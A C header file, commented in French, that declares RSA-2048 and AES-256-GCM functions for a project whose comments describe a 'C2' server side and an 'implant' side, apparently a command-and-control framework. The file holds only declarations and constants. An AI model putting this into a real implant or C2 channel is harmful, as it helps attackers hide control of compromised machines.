#ifndef FSO_CRYPTO_COMMON_H
#define FSO_CRYPTO_COMMON_H

#include <stdint.h>
#include <stddef.h>

#define FSO_RSA_KEY_BITS   2048
#define FSO_RSA_PUB_SIZE   294   /* DER SubjectPublicKeyInfo (approx.) */
#define FSO_RSA_PRIV_SIZE  1218  /* DER PKCS#8 (approx.) */
#define FSO_AES_KEY_SIZE   32    /* 256 bits */
#define FSO_IV_SIZE        12    /* 96 bits pour GCM */
#define FSO_TAG_SIZE       16    /* 128 bits */
#define FSO_RANDOM_SIZE    32    /* octets aléatoires par défaut */

/* ---------- Codes d'erreur ---------- */

typedef enum {
    FSO_CRYPTO_OK            = 0,
    FSO_CRYPTO_ERR_INIT      = -1,
    FSO_CRYPTO_ERR_KEYGEN    = -2,
    FSO_CRYPTO_ERR_ENCRYPT   = -3,
    FSO_CRYPTO_ERR_DECRYPT   = -4,
    FSO_CRYPTO_ERR_RANDOM    = -5,
    FSO_CRYPTO_ERR_INVALID   = -6,
    FSO_CRYPTO_ERR_MEMORY    = -7,
    FSO_CRYPTO_ERR_FORMAT    = -8
} fso_crypto_status_t;

/* ---------- Structures ---------- */

/* Paire de clés RSA. */
typedef struct {
    uint8_t *pub;       /* clé publique DER */
    size_t   pub_len;
    uint8_t *priv;      /* clé privée DER */
    size_t   priv_len;
} fso_rsa_keypair_t;

/* Bloc AES-GCM chiffré : IV || CIPHERTEXT || TAG. */
typedef struct {
    uint8_t *data;      /* IV || CT || TAG */
    size_t   len;
} fso_aes_block_t;

/* ============================================================
 * Initialisation / nettoyage
 * ============================================================ */

/* Initialise la bibliothèque crypto (OpenSSL côté C2, CryptoAPI côté
 * implant). À appeler une fois au démarrage.
 * Retourne FSO_CRYPTO_OK en succès. */
int fso_crypto_init(void);

/* Libère les ressources globales de la crypto. */
void fso_crypto_cleanup(void);

/* ============================================================
 * Aléatoire
 * ============================================================ */

/* Remplit `buf` avec `len` octets aléatoires cryptographiquement sûrs.
 * Retourne FSO_CRYPTO_OK ou un code d'erreur. */
int fso_random_bytes(uint8_t *buf, size_t len);

/* ============================================================
 * RSA-2048
 * ============================================================ */

/* Génère une paire de clés RSA-2048.
 * `keypair` est alloué et doit être libéré avec fso_rsa_free().
 * Retourne FSO_CRYPTO_OK ou un code d'erreur. */
int fso_rsa_generate(fso_rsa_keypair_t *keypair);

/* Chiffre `in` (taille `in_len`) avec la clé publique `pub`.
 * `out` doit être alloué par l'appelant (taille >= FSO_RSA_PUB_SIZE).
 * `out_len` reçoit la taille réelle du chiffré.
 * Retourne FSO_CRYPTO_OK ou un code d'erreur. */
int fso_rsa_encrypt(const uint8_t *pub, size_t pub_len,
                    const uint8_t *in, size_t in_len,
                    uint8_t *out, size_t *out_len);

/* Déchiffre `in` (taille `in_len`) avec la clé privée `priv`.
 * `out` doit être alloué par l'appelant.
 * `out_len` reçoit la taille réelle du déchiffré.
 * Retourne FSO_CRYPTO_OK ou un code d'erreur. */
int fso_rsa_decrypt(const uint8_t *priv, size_t priv_len,
                    const uint8_t *in, size_t in_len,
                    uint8_t *out, size_t *out_len);

/* Libère une paire de clés RSA. */
void fso_rsa_free(fso_rsa_keypair_t *keypair);

/* ============================================================
 * AES-256-GCM
 * ============================================================ */

/* Chiffre `plaintext` (taille `pt_len`) avec la clé `key` (32 octets).
 * Génère un IV aléatoire de 12 octets.
 * `out` reçoit IV || CIPHERTEXT || TAG.
 * `out_len` reçoit la taille totale (12 + pt_len + 16).
 * `out` doit être alloué par l'appelant (taille >= 12 + pt_len + 16).
 * Retourne FSO_CRYPTO_OK ou un code d'erreur. */
int fso_aes_encrypt(const uint8_t *key,
                    const uint8_t *plaintext, size_t pt_len,
                    uint8_t *out, size_t *out_len);

/* Déchiffre `in` (taille `in_len`) avec la clé `key` (32 octets).
 * `in` contient IV || CIPHERTEXT || TAG.
 * `out` reçoit le plaintext.
 * `out_len` reçoit la taille du plaintext.
 * `out` doit être alloué par l'appelant (taille >= in_len - 28).
 * Retourne FSO_CRYPTO_OK ou un code d'erreur. */
int fso_aes_decrypt(const uint8_t *key,
                    const uint8_t *in, size_t in_len,
                    uint8_t *out, size_t *out_len);

/* ============================================================
 * Helpers
 * ============================================================ */

/* Génère une clé AES-256 aléatoire (32 octets).
 * Retourne FSO_CRYPTO_OK ou un code d'erreur. */
int fso_aes_generate_key(uint8_t *key);


#endif /* FSO_CRYPTO_COMMON_H */